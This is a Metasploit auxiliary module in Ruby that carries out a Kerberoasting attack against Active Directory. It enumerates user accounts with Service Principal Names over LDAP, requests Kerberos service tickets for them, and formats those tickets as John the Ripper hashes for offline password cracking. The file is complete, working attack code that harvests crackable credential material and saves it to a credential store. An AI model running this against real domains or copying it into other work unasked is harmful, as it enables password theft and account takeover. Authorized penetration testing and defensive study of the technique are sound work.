##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Kerberos::Client
  include Msf::Exploit::Remote::LDAP
  include Msf::Exploit::Remote::LDAP::Queries
  include Msf::OptionalSession::LDAP
  include Msf::Exploit::Deprecated

  moved_from 'auxiliary/gather/get_user_spns'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gather Ticket Granting Service (TGS) tickets for User Service Principal Names (SPN)',
        'Description' => %q{
          This module will try to find Service Principal Names that are associated with normal user accounts.
          Since normal accounts' passwords tend to be shorter than machine accounts, and knowing that a TGS request
          will encrypt the ticket with the account the SPN is running under, this could be used for an offline
          bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
          This is part of the kerberoast attack research by Tim Medin (@timmedin).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Alberto Solino', # impacket example
          'smashery', # MSF Module
        ],
        'References' => [
          ['URL', 'https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [],
          'AKA' => ['GetUserSpns.py', 'get_user_spns']
        }
      )
    )

    register_options(
      [
        Opt::RHOSTS(nil, true, 'The target KDC, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html'),
        OptString.new('TARGET_USER', [ false, 'Specific user to kerberoast' ]),
        OptString.new('Rhostname', [ false, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
        Msf::OptAddress.new('DomainControllerRhost', [false, 'The resolvable rhost for the Domain Controller'], fallbacks: ['rhost']),
      ]
    )
    register_option_group(name: 'SESSION',
                          description: 'Used when connecting to LDAP over an existing SESSION',
                          option_names: %w[RHOSTS],
                          required_options: %w[SESSION RHOSTS])
    register_advanced_options(
      [
        OptEnum.new('LDAP::Auth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::NTLM, Msf::Exploit::Remote::AuthOption::LDAP_OPTIONS]),
      ]
    )
  end

  def run
    if datastore['TARGET_USER'].nil?
      run_ldap
    else
      run_user
    end
  rescue Errno::ECONNRESET
    fail_with(Failure::Disconnected, 'The connection was reset.')
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
    fail_with(Failure::NoAccess, e.message)
  rescue Net::LDAP::Error => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def run_user
    user = datastore['TARGET_USER']
    filter = "(&(objectClass=user)(sAMAccountName=#{Net::LDAP::Filter.escape(user)}))"
    attributes = ['servicePrincipalName', 'sAMAccountName']
    spn = nil
    count = run_ldap_query(filter, attributes) do |result|
      if result.respond_to?(:serviceprincipalname)
        spn = result.serviceprincipalname[0]
      end
    end
    if count == 0
      fail_with(Failure::BadConfig, "User #{user} not found")
    elsif spn.nil?
      fail_with(Failure::BadConfig, "User #{user} has no SPN")
    end
    begin
      jtr = roast(user, spn)
      jtr_format = Metasploit::Framework::Hashes.identify_hash(jtr)
      report_hash(jtr, jtr_format)
      print_good("Success: \n#{jtr}")
    rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
      print_error("#{user} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
    end
  end

  def run_ldap
    jtr_formats = Set.new
    hashes = []
    run_builtin_ldap_query('ENUM_USER_SPNS_KERBEROAST') do |result|
      spn = result.serviceprincipalname[0]
      username = result.samaccountname[0]
      begin
        jtr = roast(username, spn)
        hashes.append(jtr)
        jtr_format = Metasploit::Framework::Hashes.identify_hash(jtr)
        jtr_formats.add(jtr_format)
        report_hash(jtr, jtr_format)
      rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
        print_error("#{username} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
      end
    end
    if hashes.empty?
      print_error('No hashes were obtained from kerberoasting.')
      return
    end

    print_good("Success: \n#{hashes.join("\n")}")

    if jtr_formats.length > 1
      print_warning('NOTE: Multiple encryption types returned - will require separate cracking runs for each type.')
      print_status('To obtain the crackable values for a praticular type, run `creds`:')
      jtr_formats.each do |format|
        print_status("creds -t #{format} -O #{datastore['RHOST']} -o <outfile.(jtr|hcat)>")
      end
    end
  end

  def roast(roasted, spn)
    components = spn.split('/')
    fail_with(Failure::UnexpectedReply, "Invalid SPN: #{spn}") unless components.length == 2

    sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
      name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
      name_string: components
    )
    domain_name = datastore['LDAPDomain']
    rhostname = datastore['DomainControllerRhost']
    username = datastore['LDAPUsername']
    password = datastore['LDAPPassword']
    authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(
      host: rhostname,
      realm: domain_name,
      username: username,
      password: password,
      framework: framework,
      framework_module: framework_module
    )

    # Get a TGT - allow getting from cache
    options = {
      cache_file: datastore['LDAP::Krb5Ccname']
    }
    credential = authenticator.request_tgt_only(options)

    now = Time.now.utc
    expiry_time = now + 1.day

    ticket = Rex::Proto::Kerberos::Model::Ticket.decode(credential.ticket.value)
    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
      type: credential.keyblock.enctype.value,
      value: credential.keyblock.data.value
    )

    tgs_options = {
      pa_data: []
    }

    tgs_ticket, = authenticator.request_service_ticket(
      session_key,
      ticket,
      domain_name.upcase,
      username,
      offered_etypes,
      expiry_time,
      now,
      sname,
      tgs_options
    )

    format_tgs_rep_to_john_hash(tgs_ticket, roasted)
  end

  def report_hash(hash, jtr_format)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'Kerberos',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: jtr_format
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def offered_etypes
    Msf::Exploit::Remote::AuthOption.as_default_offered_etypes(datastore['LDAP::KrbOfferedEncryptionTypes'])
  end

  attr_accessor :ldap_query # The LDAP query for this module, loaded from a yaml file

end
